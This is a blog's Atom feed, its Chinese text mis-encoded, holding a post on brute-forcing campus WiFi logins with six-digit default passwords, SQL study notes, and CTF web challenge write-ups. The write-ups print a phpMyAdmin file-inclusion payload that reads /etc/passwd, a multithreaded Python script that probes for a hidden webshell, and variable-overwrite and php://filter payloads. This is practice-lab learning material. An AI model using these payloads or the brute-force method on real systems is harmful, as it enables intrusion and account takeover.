<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ä¸­å›½ç†ŠçŒ«çš„åšå®¢</title>
  
  <subtitle>ä¸€åˆ†è€•è€˜ï¼Œä¸€åˆ†æ”¶è·</subtitle>
  <link href="http://haorical.xyz/atom.xml" rel="self"/>
  
  <link href="http://haorical.xyz/"/>
  <updated>2022-01-17T07:14:32.830Z</updated>
  <id>http://haorical.xyz/</id>
  
  <author>
    <name>Haorical</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ä¸€ç§åŸºäºWiFiç™»å½•çš„ç”¨æˆ·å¯†ç æš´åŠ›ç ´è§£æ–¹æ³•</title>
    <link href="http://haorical.xyz/posts/69af83f3/"/>
    <id>http://haorical.xyz/posts/69af83f3/</id>
    <published>2022-01-17T06:56:31.000Z</published>
    <updated>2022-01-17T07:14:32.830Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰æ"><a href="#å‰æ" class="headerlink" title="å‰æ"></a>å‰æ</h2><p><strong>åªç”¨æ¥è®°å½•åŸºæœ¬æ€è·¯ï¼Œä¸æä¾›ä»»ä½•ä»£ç ï¼Œæµ‹è¯•è´¦å·å·²ç»è¿‡å½“äº‹äººåŒæ„</strong></p><span id="more"></span><h2 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h2><p>è¯¥æ¼æ´çš„ä¸»è¦æ˜¯åŸºäºå¼±å¯†ç æ–¹å¼æš´åŠ›ç ´è§£ï¼Œä¸»è¦æ˜¯å› ä¸º6ä½æ•°å­—ç ´è§£æ—¶é—´å¾ˆçŸ­ï¼Œä¸»è¦é™åˆ¶å› ç´ å°±æ˜¯cpuå’Œç½‘ç»œç¯å¢ƒ</p><p>æµ‹è¯•äº†å‡ ä¸ªå®¹æ˜“å‡ºç°å¼±å¯†ç çš„ç«™ç‚¹ï¼Œå¤§éƒ½åšäº†é™åˆ¶ï¼Œå¦‚æ•™åŠ¡éƒ¨ï¼Œå¾®å­¦å·¥ç­‰ï¼Œå¤±è´¥æ¬¡æ•°è¿‡å¤šä¼šè¢«ç¦æ­¢ç™»å½•</p><p>wifi(CUMT_Stu)ç™»å½•ä¹Ÿä¼šå‡ºç°ç›¸åŒæƒ…å†µï¼Œç™»å½•æ¬¡æ•°è¿‡å¤šï¼Œä¼šè¿”å›userid lockedï¼Œä½†å¯¹å¤±è´¥æ¬¡æ•°æ²¡æœ‰é™åˆ¶ï¼Œåªè¦ä¸€æ¬¡ç™»å½•æˆåŠŸï¼Œä¾¿ä¼šè¿”å›æˆåŠŸç™»å½•</p><p>å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´æ¥å®ç°å¯†ç çš„æš´åŠ›ç ´è§£ï¼Œåº”ç”¨ä¹‹å‰æ¨¡æ‹Ÿç™»å½•æ ¡å›­ç½‘çš„è„šæœ¬ï¼Œç¨å¾®æ›´æ”¹å³å¯ï¼ŒåŒæ—¶ä½¿ç”¨å¤šçº¿ç¨‹æ¥ä¼˜åŒ–ï¼Œæµ‹è¯•æœ€å¿«å¯åœ¨2minå†…è·å¾—ç™»å½•å¯†ç ï¼Œæ•ˆæœéå¸¸å¥½</p><h2 id="é¿å…æ–¹æ³•"><a href="#é¿å…æ–¹æ³•" class="headerlink" title="é¿å…æ–¹æ³•"></a>é¿å…æ–¹æ³•</h2><p>è¿˜æ˜¯å»ºè®®å¤§å®¶ç¨å¾®æ”¹æ”¹å¯†ç ï¼Œä¸è¦è€æ˜¯ç”¨é»˜è®¤çš„ï¼Œè™½ç„¶6ä½ï¼Œä½†å’Œ123456åŸºæœ¬æ²¡å•¥åŒºåˆ«ï¼Œå¯èƒ½è¢«ä¸æ³•åˆ†å­åˆ©ç”¨ï¼Œæ¥ç™»å½•å…¶ä»–å¯èƒ½çš„ç«™ç‚¹ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰æ&quot;&gt;&lt;a href=&quot;#å‰æ&quot; class=&quot;headerlink&quot; title=&quot;å‰æ&quot;&gt;&lt;/a&gt;å‰æ&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;åªç”¨æ¥è®°å½•åŸºæœ¬æ€è·¯ï¼Œä¸æä¾›ä»»ä½•ä»£ç ï¼Œæµ‹è¯•è´¦å·å·²ç»è¿‡å½“äº‹äººåŒæ„&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="pythonå®è·µ" scheme="http://haorical.xyz/categories/python%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="python" scheme="http://haorical.xyz/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>sqlå­¦ä¹ </title>
    <link href="http://haorical.xyz/posts/e8cf058b/"/>
    <id>http://haorical.xyz/posts/e8cf058b/</id>
    <published>2022-01-16T12:28:22.000Z</published>
    <updated>2022-01-16T15:01:31.683Z</updated>
    
    <content type="html"><![CDATA[<h2 id="é…ç½®æ•°æ®åº“ç¯å¢ƒ"><a href="#é…ç½®æ•°æ®åº“ç¯å¢ƒ" class="headerlink" title="é…ç½®æ•°æ®åº“ç¯å¢ƒ"></a>é…ç½®æ•°æ®åº“ç¯å¢ƒ</h2><p>å»ºè®®ç›´æ¥ä¹°ä¸ªäº‘mysqlæœåŠ¡å™¨ï¼Œæœ¬åœ°é…ç½®å¤ªæŠ˜ç£¨äººäº†</p><h2 id="è¿æ¥"><a href="#è¿æ¥" class="headerlink" title="è¿æ¥"></a>è¿æ¥</h2><h2 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line">use [æ•°æ®åº“å]</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">describe</span> [è¡¨å]ï¼› <span class="comment">--æ˜¾ç¤ºè¡¨ä¿¡æ¯</span></span><br><span class="line">creat database [db] <span class="comment">--åˆ›å»ºæ•°æ®åº“</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">å¤šè¡Œæ³¨é‡Š</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="å…³ç³»æ¨¡å‹"><a href="#å…³ç³»æ¨¡å‹" class="headerlink" title="å…³ç³»æ¨¡å‹"></a>å…³ç³»æ¨¡å‹</h2><h3 id="ä¸»é”®"><a href="#ä¸»é”®" class="headerlink" title="ä¸»é”®"></a>ä¸»é”®</h3><p>ä¸€èˆ¬id,åŸºæœ¬ä¸ç”¨è”åˆä¸»é”®</p><p>å”¯ä¸€åŒºåˆ«ä¸¤æ¡è®°å½•æ˜¯å¦ç›¸åŒ</p><p>ä¸ä½¿ç”¨ä¸šåŠ¡ç›¸å…³</p><p>id ä¸¤ç±»:</p><ol><li>è‡ªå¢æ•´æ•°</li><li>GUID</li></ol><h3 id="å¤–é”®"><a href="#å¤–é”®" class="headerlink" title="å¤–é”®"></a>å¤–é”®</h3><h4 id="ä¸€å¯¹å¤š"><a href="#ä¸€å¯¹å¤š" class="headerlink" title="ä¸€å¯¹å¤š"></a>ä¸€å¯¹å¤š</h4><p>é€šè¿‡ä¸€ä¸ªè¡¨çš„å¤–é”®å…³è”åˆ°å¦ä¸€ä¸ªè¡¨ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰å‡ºä¸€å¯¹å¤šå…³ç³»</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># æ·»åŠ å¤–é”®çº¦æŸ</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> students</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> fk_class_id <span class="comment">-- çº¦æŸåç§°ï¼Œéšä¾¿å–</span></span><br><span class="line"><span class="keyword">FOREIGN</span> KEY (class_id) <span class="comment">--æŒ‡å®šå¤–é”®</span></span><br><span class="line"><span class="keyword">REFERENCES</span> classes (id); <span class="comment">-- å°†å¤–é”®å…³è”åˆ°classesä¸»é”®id</span></span><br><span class="line"># åˆ é™¤å¤–é”®çº¦æŸ å¹¶ä¸åˆ é™¤åˆ—</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> students</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">FOREIGN</span> KEY fk_class_id;</span><br></pre></td></tr></table></figure><p>å¤–é”®çº¦æŸçš„åç§°fk_class_idå¯ä»¥ä»»æ„ï¼ŒFOREIGN KEY (class_id)æŒ‡å®šäº†class_idä½œä¸ºå¤–é”®ï¼ŒREFERENCES classes (id)æŒ‡å®šäº†è¿™ä¸ªå¤–é”®å°†å…³è”åˆ°classesè¡¨çš„idåˆ—ï¼ˆå³classesè¡¨çš„ä¸»é”®ï¼‰ã€‚</p><h4 id="å¤šå¯¹å¤š"><a href="#å¤šå¯¹å¤š" class="headerlink" title="å¤šå¯¹å¤š"></a>å¤šå¯¹å¤š</h4><p>å¤šå¯¹å¤šå…³ç³»å®é™…ä¸Šæ˜¯é€šè¿‡ä¸¤ä¸ªä¸€å¯¹å¤šå…³ç³»å®ç°çš„ï¼Œå³é€šè¿‡ä¸€ä¸ªä¸­é—´è¡¨ï¼Œå…³è”ä¸¤ä¸ªä¸€å¯¹å¤šå…³ç³»ï¼Œå°±å½¢æˆäº†å¤šå¯¹å¤šå…³ç³»</p><p>teacherâ€“&gt;teacher_class&lt;â€“class</p><h4 id="ä¸€å¯¹ä¸€"><a href="#ä¸€å¯¹ä¸€" class="headerlink" title="ä¸€å¯¹ä¸€"></a>ä¸€å¯¹ä¸€</h4><p>ä¸€ä¸ªè¡¨çš„è®°å½•å¯¹åº”åˆ°å¦ä¸€ä¸ªè¡¨çš„å”¯ä¸€ä¸€ä¸ªè®°å½•ã€‚</p><p>æœ‰ç»†å¿ƒçš„ç«¥é‹ä¼šé—®ï¼Œæ—¢ç„¶æ˜¯ä¸€å¯¹ä¸€å…³ç³»ï¼Œé‚£ä¸ºå•¥ä¸ç»™studentsè¡¨å¢åŠ ä¸€ä¸ªmobileåˆ—ï¼Œè¿™æ ·å°±èƒ½åˆäºŒä¸ºä¸€äº†ï¼Ÿ</p><p>å¦‚æœä¸šåŠ¡å…è®¸ï¼Œå®Œå…¨å¯ä»¥æŠŠä¸¤ä¸ªè¡¨åˆä¸ºä¸€ä¸ªè¡¨ã€‚ä½†æ˜¯ï¼Œæœ‰äº›æ—¶å€™ï¼Œå¦‚æœæŸä¸ªå­¦ç”Ÿæ²¡æœ‰æ‰‹æœºå·ï¼Œé‚£ä¹ˆï¼Œcontactsè¡¨å°±ä¸å­˜åœ¨å¯¹åº”çš„è®°å½•ã€‚å®é™…ä¸Šï¼Œä¸€å¯¹ä¸€å…³ç³»å‡†ç¡®åœ°è¯´ï¼Œæ˜¯contactsè¡¨ä¸€å¯¹ä¸€å¯¹åº”studentsè¡¨ã€‚</p><p>è¿˜æœ‰ä¸€äº›åº”ç”¨ä¼šæŠŠä¸€ä¸ªå¤§è¡¨æ‹†æˆä¸¤ä¸ªä¸€å¯¹ä¸€çš„è¡¨ï¼Œç›®çš„æ˜¯æŠŠç»å¸¸è¯»å–å’Œä¸ç»å¸¸è¯»å–çš„å­—æ®µåˆ†å¼€ï¼Œä»¥è·å¾—æ›´é«˜çš„æ€§èƒ½ã€‚ä¾‹å¦‚ï¼ŒæŠŠä¸€ä¸ªå¤§çš„ç”¨æˆ·è¡¨åˆ†æ‹†ä¸ºç”¨æˆ·åŸºæœ¬ä¿¡æ¯è¡¨user_infoå’Œç”¨æˆ·è¯¦ç»†ä¿¡æ¯è¡¨user_profilesï¼Œå¤§éƒ¨åˆ†æ—¶å€™ï¼Œåªéœ€è¦æŸ¥è¯¢user_infoè¡¨ï¼Œå¹¶ä¸éœ€è¦æŸ¥è¯¢user_profilesè¡¨ï¼Œè¿™æ ·å°±æé«˜äº†æŸ¥è¯¢é€Ÿåº¦ã€‚</p><h3 id="ç´¢å¼•"><a href="#ç´¢å¼•" class="headerlink" title="ç´¢å¼•"></a>ç´¢å¼•</h3><p>åœ¨å…³ç³»æ•°æ®åº“ä¸­ï¼Œå¦‚æœæœ‰ä¸Šä¸‡ç”šè‡³ä¸Šäº¿æ¡è®°å½•ï¼Œåœ¨æŸ¥æ‰¾è®°å½•çš„æ—¶å€™ï¼Œæƒ³è¦è·å¾—éå¸¸å¿«çš„é€Ÿåº¦ï¼Œå°±éœ€è¦ä½¿ç”¨ç´¢å¼•ã€‚</p><p>ç´¢å¼•çš„æ•ˆç‡å–å†³äºç´¢å¼•åˆ—çš„å€¼æ˜¯å¦æ•£åˆ—ï¼Œå³è¯¥åˆ—çš„å€¼å¦‚æœè¶Šäº’ä¸ç›¸åŒï¼Œé‚£ä¹ˆç´¢å¼•æ•ˆç‡è¶Šé«˜ã€‚<code>ç±»ä¼¼hash</code></p><p>å¯¹äºä¸»é”®ï¼Œå…³ç³»æ•°æ®åº“ä¼šè‡ªåŠ¨å¯¹å…¶åˆ›å»ºä¸»é”®ç´¢å¼•ã€‚ä½¿ç”¨ä¸»é”®ç´¢å¼•çš„æ•ˆç‡æ˜¯æœ€é«˜çš„ï¼Œå› ä¸ºä¸»é”®ä¼šä¿è¯ç»å¯¹å”¯ä¸€ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> students</span><br><span class="line"><span class="keyword">ADD</span> INDEX idx_name_score (name, score);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;é…ç½®æ•°æ®åº“ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#é…ç½®æ•°æ®åº“ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;é…ç½®æ•°æ®åº“ç¯å¢ƒ&quot;&gt;&lt;/a&gt;é…ç½®æ•°æ®åº“ç¯å¢ƒ&lt;/h2&gt;&lt;p&gt;å»ºè®®ç›´æ¥ä¹°ä¸ªäº‘mysqlæœåŠ¡å™¨ï¼Œæœ¬åœ°é…ç½®å¤ªæŠ˜ç£¨äººäº†&lt;/p&gt;
&lt;h2 id=&quot;è¿æ¥&quot;&gt;&lt;a href=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>20220101</title>
    <link href="http://haorical.xyz/posts/c3e022b4/"/>
    <id>http://haorical.xyz/posts/c3e022b4/</id>
    <published>2022-01-01T08:39:48.000Z</published>
    <updated>2022-01-01T08:39:48.550Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>20211129</title>
    <link href="http://haorical.xyz/posts/11d5b1/"/>
    <id>http://haorical.xyz/posts/11d5b1/</id>
    <published>2021-11-29T02:56:30.000Z</published>
    <updated>2021-11-29T16:27:30.442Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h2><blockquote><p>phpmyadmin 4.8 cve æ–‡ä»¶åŒ…å«æ¼æ´</p></blockquote><pre><code>?target=db_sql.php%253f/../../../../../../etc/passwd</code></pre><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>å­¦åˆ°äº†è¯·æ±‚æœ‰getæ”¹æˆpost</p><p>ç‚¹å‡»helpï¼Œå‘ç°æŠ¥é”™ï¼ŒæŠŠgetæ”¹ä¸ºpostï¼ŒåŒæ—¶æ”¹åé¢å‚æ•°ï¼Œæ”¹æˆpostä¸Šå»</p><pre><code>com.wm.ctf.DownloadController.doPost(DownloadController.java:24)</code></pre><p>å¾—åˆ°ä¸€ä¸ªå¥‡æ€ªçš„åŒ…çš„ç›®å½•</p><p>çœ‹äº†ä¸‹wpï¼Œjavaé¡¹ç›®æºç åœ¨WEB-INFä¸­ï¼Œæ„é€ pyload</p><p>paramséœ€è¦åŠ ä¸ªfilename=WEB-INF/classes/com/wm/ctf/FlagController.class åŒæ—¶post filenameå°±å¯ä»¥æŠŠclassä¸‹ä¸‹æ¥</p><h2 id="å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢"><a href="#å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢"></a>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h2><p>æŠŠæºç ä¸‹ä¸‹æ¥ï¼Œä¸€å…±å¥½å‡ åƒä¸ªæ–‡ä»¶é‡Œé¢æœ‰æˆ‘ä»¬éœ€è¦çš„é©¬ï¼Œæˆ‘ä»¬åªéœ€è¦ä¸€ä¸ªä¸€ä¸ªè¯•å³å¯ğŸ¥°</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(<span class="string">&#x27;å¼€å§‹æ—¶é—´ï¼š  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)    <span class="comment">#è¿™å„¿è®¾ç½®æœ€å¤§çš„çº¿ç¨‹æ•°</span></span><br><span class="line">filePath = <span class="string">r&quot;C:\Users\haodo\Desktop\20211129\é«˜æ˜é»‘å®¢\src&quot;</span></span><br><span class="line">os.chdir(filePath)<span class="comment">#æ”¹å˜å½“å‰çš„è·¯å¾„</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span><span class="comment">#è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span> <span class="comment"># è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalse</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">    s1.acquire()</span><br><span class="line">    print(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:<span class="comment">#æ‰“å¼€phpæ–‡ä»¶ï¼Œæå–æ‰€æœ‰çš„$_GETå’Œ$_POSTçš„å‚æ•°</span></span><br><span class="line">            gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;<span class="comment">#æ‰€æœ‰çš„$_POST</span></span><br><span class="line">    params = &#123;&#125;<span class="comment">#æ‰€æœ‰çš„$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://fab0ef41-82a7-480e-a354-be549de9731f.node4.buuoj.cn:81/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)<span class="comment">#ä¸€æ¬¡æ€§è¯·æ±‚æ‰€æœ‰çš„GETå’ŒPOST</span></span><br><span class="line">    req.close()<span class="comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:<span class="comment">#å¦‚æœå‘ç°æœ‰å¯ä»¥åˆ©ç”¨çš„å‚æ•°ï¼Œç»§ç»­ç­›é€‰å‡ºå…·ä½“çš„å‚æ•°</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()<span class="comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()<span class="comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:<span class="comment">#flagç”¨æ¥åˆ¤æ–­å‚æ•°æ˜¯GETè¿˜æ˜¯POSTï¼Œå¦‚æœæ˜¯GETï¼Œflag==1ï¼Œåˆ™bæœªå®šä¹‰ï¼›å¦‚æœæ˜¯POSTï¼Œflagä¸º0ï¼Œ</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">&#x27;æ‰¾åˆ°äº†åˆ©ç”¨æ–‡ä»¶ï¼š &#x27;</span>+file+<span class="string">&quot;  and æ‰¾åˆ°äº†åˆ©ç”¨çš„å‚æ•°ï¼š%s&quot;</span> %param)</span><br><span class="line">        print(<span class="string">&#x27;ç»“æŸæ—¶é—´ï¼š  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:<span class="comment">#åŠ å…¥å¤šçº¿ç¨‹</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure><p>éœ€è¦å…ˆæœ¬åœ°æµ‹è¯•ï¼Œæ‰¾åˆ°é©¬åç›´æ¥æœåŠ¡å™¨åˆ©ç”¨å³å¯</p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>å˜é‡è¦†ç›–æ¼æ´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¥½å¤špayload:</p><pre><code>yds=flagis=flag&amp;flag=flag</code></pre><h2 id="Had-a-bad-day"><a href="#Had-a-bad-day" class="headerlink" title="Had a bad day"></a>Had a bad day</h2><p>php://filteråº”ç”¨</p><p><a href="https://oatmeal.vip/security/web-learning/php-filter/">https://oatmeal.vip/security/web-learning/php-filter/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>æ„é€ :</p><pre><code>php://filter/convert.base64-encode/write=woofers/resource=flag</code></pre>]]></content>
    
    
      
      
